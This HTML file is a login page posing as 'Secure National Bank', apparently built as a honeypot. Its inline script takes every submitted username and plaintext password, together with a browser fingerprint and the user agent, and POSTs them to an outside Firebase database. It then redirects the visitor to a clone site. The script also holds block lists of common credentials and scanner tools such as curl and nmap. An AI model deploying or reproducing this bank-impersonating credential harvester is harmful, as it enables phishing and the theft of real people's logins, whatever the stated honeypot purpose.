<!DOCTYPE html>
<html lang="en" data-theme="light">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Banking Portal</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <header>
    <h1>🏦 Secure National Bank</h1>
    <nav>
      <ul>
        <li><a href="#">Home</a></li>
        <li><a href="#services">Services</a></li>
        <li><a href="#contact">Contact</a></li>
        <li><a href="#login">Login</a></li>
      </ul>
    </nav>
  </header>

  <div class="toggle-container">
    <button onclick="toggleTheme()">🌃 Toggle Theme</button>
  </div>

  <main>
    <section class="hero">
      <h2>Welcome to Secure National Bank</h2>
      <p>Access your accounts, manage transactions, and more.</p>
    </section>

    <section id="services">
      <h3>Our Services</h3>
      <ul>
        <li>💳 Credit Cards</li>
        <li>🏠 Loans</li>
        <li>💼 Business Accounts</li>
        <li>📈 Investment Services</li>
      </ul>
    </section>

    <section id="contact">
      <h3>Contact Us</h3>
      <p>Email: support@securebank.com</p>
      <p>Phone: +966-500-000-000</p>
    </section>

    <section id="login">
      <h3>Secure Client Access</h3>
      <p>This portal is protected. Any unauthorized access will be logged.</p>
      <form onsubmit="handleLogin(); return false;">
        <label for="username">Username:</label><br>
        <input type="text" id="username" name="username" required><br><br>

        <label for="password">Password:</label><br>
        <input type="password" id="password" name="password" required><br><br>

        <input type="submit" value="Login">
      </form>
    </section>
  </main>

  <footer>
    <p>&copy; 2025 Secure National Bank</p>
  </footer>

  <script src="firebase.js"></script>
  <script src="detect.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
  <script>
    const badUsernames = ["admin", "root", "test"];
    const badPasswords = ["123456", "admin", "password", "root"];
    const badAgents = ["curl", "python", "dirbuster", "nmap"];
    let attempts = JSON.parse(localStorage.getItem("login_attempts") || "0");

    function handleLogin() {
      const attackerIP = localStorage.getItem("attacker_ip") || "unknown";
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const userAgent = navigator.userAgent.toLowerCase();

      const isSuspicious = badUsernames.includes(username.toLowerCase()) ||
                           badPasswords.includes(password.toLowerCase()) ||
                           badAgents.some(agent => userAgent.includes(agent));

      attempts++;
      localStorage.setItem("login_attempts", JSON.stringify(attempts));

      new Fingerprint2().get(function(components) {
        const fingerprint = Fingerprint2.x64hash128(components.map(p => p.value).join(), 31);
        const payload = {
          ip: attackerIP,
          fingerprint: fingerprint,
          username: username,
          password: password,
          timestamp: new Date().toISOString(),
          isHacker: isSuspicious || attempts > 3,
          event: "Login attempt",
          userAgent: userAgent
        };

        fetch("https://honeypot-715b9-default-rtdb.firebaseio.com/clone_access.json", {
          method: "POST",
          body: JSON.stringify(payload)
        });
      });

      window.location.href = "https://secure-national-bank-clone.vercel.app";
    }

    function toggleTheme() {
      const html = document.documentElement;
      html.dataset.theme = html.dataset.theme === "dark" ? "light" : "dark";
    }
  </script>
</body>
</html>
